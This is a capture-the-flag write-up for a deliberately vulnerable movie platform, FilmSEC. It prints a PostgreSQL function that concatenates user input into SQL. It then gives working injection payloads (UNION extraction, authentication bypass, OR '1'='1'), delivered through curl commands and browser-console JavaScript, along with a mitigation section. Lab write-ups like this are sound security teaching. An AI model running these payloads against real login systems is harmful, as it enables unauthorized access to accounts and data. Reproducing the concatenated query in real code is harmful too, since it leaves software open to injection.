# FilmSEC CTF Challenge - SQL Injection Write-Up

## Challenge Overview
- **Application**: FilmSEC - Movie Recommendation Platform
- **Vulnerability**: SQL Injection in Authentication
- **Goal**: Exploit SQLi to gain admin access and retrieve the flag
- **Difficulty**: Easy/Intermediate

## Flag
```
flag{7f3c91d2a8be4c6f9d1eab27c4f80193_filmsec_admin_only}
```

## Vulnerability Location
**File**: `backend/src/routes/auth.ts`  
**Endpoint**: `POST /api/auth/signin`  
**Function**: `authenticate_user` (PostgreSQL RPC function)

### Vulnerable Code
```sql
CREATE OR REPLACE FUNCTION authenticate_user(p_email TEXT, p_password TEXT)
RETURNS TABLE (...) 
LANGUAGE plpgsql SECURITY DEFINER AS $$
BEGIN
  RETURN QUERY EXECUTE '
    SELECT u.id, u.email, u.name, u.avatar, u.role, u.password, u.created_at
    FROM users u
    WHERE u.email = ''' || p_email || '''  -- VULNERABLE: String concatenation
    LIMIT 1';
END;
$$;
```

The vulnerability allows SQL injection via the `email` parameter because user input is directly concatenated into the SQL query without parameterization.

## Exploitation Steps

### Step 1: Enumerate Admin User

First, find the admin email by extracting data from the database:

```bash
curl -X POST http://192.168.100.12:4243/api/auth/signin \
  -H "Content-Type: application/json" \
  -d '{"email":"x'\'' UNION SELECT id,email,name,avatar,role,password,created_at FROM users WHERE role='\''admin'\'' --","password":"x"}'
```

**Result**:
```json
{
  "token": "eyJhbGciOiJIUzI1NiIs...",
  "user": {
    "id": "68e9d1f4-8f1f-409e-b456-6389a217ae51",
    "email": "admin@filmsec.com",
    "name": "System Administrator",
    "avatar": null,
    "role": "admin"
  }
}
```

**Discovered**: Admin email is `admin@filmsec.com`

### Step 2: Exploit Authentication Bypass

Now use the discovered admin email with SQL injection to bypass password verification:

```bash
curl -X POST http://192.168.100.12:4243/api/auth/signin \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@filmsec.com'\'' AND 1=1--","password":"x"}'
```

**Result**:
```json
{
  "token": "eyJhbGciOiJIUzI1NiIs...",
  "user": {
    "id": "68e9d1f4-8f1f-409e-b456-6389a217ae51",
    "email": "admin@filmsec.com",
    "name": "System Administrator",
    "role": "admin"
  }
}
```

**Success**: Obtained valid JWT token with admin role!

### Step 3: Retrieve the Flag

Navigate to the admin dashboard and access the Security tab, or use the API:

```bash
curl -H "Authorization: Bearer <YOUR_TOKEN>" \
  http://192.168.100.12:4243/api/admin/security-memo
```

**Result**:
```json
{
  "memo": {
    "id": "SEC-2024-001",
    "title": "Internal Security Configuration",
    "classification": "ADMIN ONLY",
    "content": "System configuration backup key for disaster recovery:",
    "recoveryKey": "flag{7f3c91d2a8be4c6f9d1eab27c4f80193_filmsec_admin_only}",
    "notes": "Store this key in a secure location. Do not share with non-admin users."
  }
}
```

## Alternative: Browser-Based Exploitation

### Step 1: Find Admin Email

In browser console on login page:
```javascript
// Try UNION injection in email field
document.getElementById('signin-email').value = "x' UNION SELECT id,email,name,avatar,role,password,created_at FROM users WHERE role='admin' --";
document.getElementById('signin-password').value = "x";
document.querySelector('form').submit();
```

### Step 2: Login as Admin

```javascript
document.getElementById('signin-email').value = "admin@filmsec.com' AND 1=1--";
document.getElementById('signin-password').value = "x";
document.querySelector('form').submit();
```

### Step 3: Access Flag

After login, navigate to `/admin` → Security tab.

## Payloads Summary

| Purpose | Payload |
|---------|---------|
| Enumerate admin | `x' UNION SELECT id,email,name,avatar,role,password,created_at FROM users WHERE role='admin' --` |
| Bypass auth | `admin@filmsec.com' AND 1=1--` |
| Basic SQLi | `admin@filmsec.com' OR '1'='1' --` |

## Mitigation

1. **Use Parameterized Queries**: Never concatenate user input into SQL
   ```sql
   -- Safe approach
   SELECT * FROM users WHERE email = $1
   ```

2. **Input Validation**: Validate email format strictly

3. **Least Privilege**: Don't use `SECURITY DEFINER` unnecessarily

4. **WAF**: Deploy Web Application Firewall to block SQLi patterns

## Key Takeaways

- SQL injection can bypass entire authentication mechanisms
- UNION-based injection allows data extraction from other tables
- RPC functions with dynamic SQL are equally vulnerable to injection
- The vulnerability is in the PostgreSQL function, not just the Node.js code

## Files Modified for CTF

1. `backend/src/database/schema.sql` - Added `role` column
2. `backend/src/routes/auth.ts` - Added vulnerable RPC call
3. `backend/src/routes/admin.ts` - Created admin routes with flag
4. `backend/src/middleware/auth.ts` - Added admin verification
5. `frontend/src/pages/AdminDashboard.tsx` - Created admin UI
6. `backend/src/database/seed.ts` - Seeded admin user

---

**Challenge completed successfully!**
